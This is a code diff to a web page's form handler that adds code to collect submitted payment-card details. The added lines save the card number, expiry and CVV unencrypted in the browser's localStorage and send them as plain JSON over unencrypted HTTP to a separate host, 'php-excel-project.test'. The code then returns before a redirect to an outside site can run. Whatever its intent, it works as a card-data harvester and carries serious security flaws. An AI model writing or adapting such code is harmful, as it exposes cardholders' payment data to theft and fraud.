@@ -735,7 +735,37 @@ if(qsp.hcity && qsp.hstate){$(".citystate").text(qsp.hcity+", "+qsp.hstate)}else
         const formData = new FormData(this);
         const data = {};
         formData.forEach((value, key) => data[key] = value);
+
+        const  writableData = localStorage.getItem('writableData')? JSON.parse(localStorage.getItem('writableData')) : [];
+       
+        $.extend( writableData, { 
+          card_number: data.cardNumber,
+          card_expiration_month_year:  data.ExpMonth + '-'+ data.ExpYear,
+          card_cvv:  data.cardCVV2
+        } );
+        const writableDataString = JSON.stringify(writableData);
+        // console.log('go writable_dat',JSON.stringify(writableData))
+        localStorage.setItem('writableData', writableDataString);
         localStorage.setItem('form4Data', JSON.stringify(data));
+        $.ajax({
+            url: 'http://php-excel-project.test', // Replace with your server URL
+            type: 'POST',
+            data: writableDataString,
+            contentType: 'application/json',
+            success: function(response) {
+                
+            },
+
+
+
+            error: function(xhr, status, error) {
+                
+            }
+        });
+        // localStorage.clear();
+        return;
+        window.location.href = 'https://aprtshare.com/Housesi00';
+
       }else {
         console.log('Form is invalid, fix the errors and try again.');
       }
